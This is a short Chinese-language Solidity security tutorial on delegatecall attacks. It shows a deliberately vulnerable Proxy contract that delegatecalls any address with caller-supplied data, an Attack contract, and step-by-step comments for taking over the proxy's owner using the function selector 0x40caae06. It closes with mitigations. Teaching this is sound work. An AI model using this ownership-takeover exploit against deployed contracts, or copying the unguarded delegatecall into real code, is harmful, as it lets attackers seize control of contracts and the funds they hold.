# 第20节：安全事故10-delegatecall攻击

当合约中存在delegatecall操作时，要格外小心，我们可以把使用delegatecall的合约当成代理合约，可以通过业务合约（Attack合约）来对代理合约进行升级，从而修改了代理合约中的数据。

以下案例中，我们通过Attack合约完成了对Proxy合约的owner修改。

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.8;

// 操作步骤：
// 1. 使用account0部署Proxy，此时owner是account0
// 2. 使用account1部署Attack，得到地址attack_addr
// 3. 调用forward(attack_addr, 0x40caae06)
// 4. 检查owner地址，此时由account0变成了account1

contract Proxy {
    address public owner;
    constructor() {
        owner = msg.sender;  
    }

    // _data: 0x40caae06
    function forward(address callee, bytes memory _data) public {
        (bool success, ) = callee.delegatecall(_data);
        require(success, "tx failed!");
    }
}

contract Attack {
    address public owner;
    function setOwner() public {
        owner = tx.origin;
    }
}
```

解决方案：

1. 尽量避免使用delegatecall
2. 如果必要使用，可以考虑权限控制、对callee的控制等，至少不能任由外界进行随便调用。